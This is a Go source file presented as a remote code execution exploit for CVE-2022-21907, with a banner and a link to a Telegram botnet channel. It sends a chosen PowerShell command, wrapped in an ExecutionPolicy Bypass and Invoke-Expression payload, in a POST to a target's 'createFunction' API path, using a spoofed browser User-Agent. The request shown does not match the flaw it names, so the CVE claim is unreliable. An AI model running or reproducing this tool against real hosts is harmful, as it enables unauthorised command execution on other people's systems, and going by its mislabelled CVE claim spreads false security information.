// CVE-2022-21907 RCE!//
// Level-7 or TG:https://t.me/hacker_the_botnet//
package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func banner() {
	a := ".--..       ..---.       .-.  .-.  .-.  .-.        .-.   .  .-.  .-..---."
	b := ":     \\     / |          (   ):   :(   )(   )      (   ).'| (   ):   :   /"
	c := "|      \\   /  |---  ____   .' |   |  .'   .'  ____   .'   |  `-/ |   |  / "
	d := ":       \\ /   |           /   :   ; /    /          /     |   /  :   ; /  "
	e := " `--'    '    '---'      '---' `-' '---''---'      '---''---''    `-' '    RCE!"
	g := "-u <Server IP> -p <Port> -h -shell <PowerShell Command>"
	f := "GOo......oOG"
	fmt.Println(a)
	fmt.Println(b)
	fmt.Println(c)
	fmt.Println(d)
	fmt.Println(e)
	fmt.Println(g)
	fmt.Println(f)
}

func main() {
	banner()
	var targetIP string
	var shellCommand string
	var Port string

	flag.StringVar(&Port, "p", "80", "Exploit Port")
	flag.StringVar(&targetIP, "u", "", "Target IP")
	flag.StringVar(&shellCommand, "shell", "", "Shell command to execute")

	flag.Parse()

	if len(os.Args) > 1 && os.Args[1] == "-h" {
		fmt.Println("-u <Server IP>", "-p <Port>", "-h", "-shell <PowerShell Command>")
		return
	}

	if targetIP == "" || shellCommand == "" {
		fmt.Println("Error! Please specify the target IP and the shell command to execute using -u and -shell parameters, respectively.")
		return
	}

	targetUrl := fmt.Sprintf("http://%s:%s/api/v1/namespace/default/actions/createFunction", targetIP, Port)

	payload := fmt.Sprintf(`{"scripts":["powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command Invoke-Expression '%s'"]}`, shellCommand)

	client := &http.Client{}
	req, err := http.NewRequest("POST", targetUrl, strings.NewReader(payload))
	if err != nil {
		fmt.Println(err)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299")
	req.Header.Set("Accept-Language", "en-US,en;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	fmt.Println(resp.Request)

	fmt.Println("Request:\n", resp.Status)
	fmt.Println("漏洞利用完毕 END!:\n", "请注意!PoC无法检测RCE是否成功被执行!除非您在靶机执行了类似<Invoke-WebRequest>命令的方式通过监听指定端口检测靶机是否执行了RCE!")
}
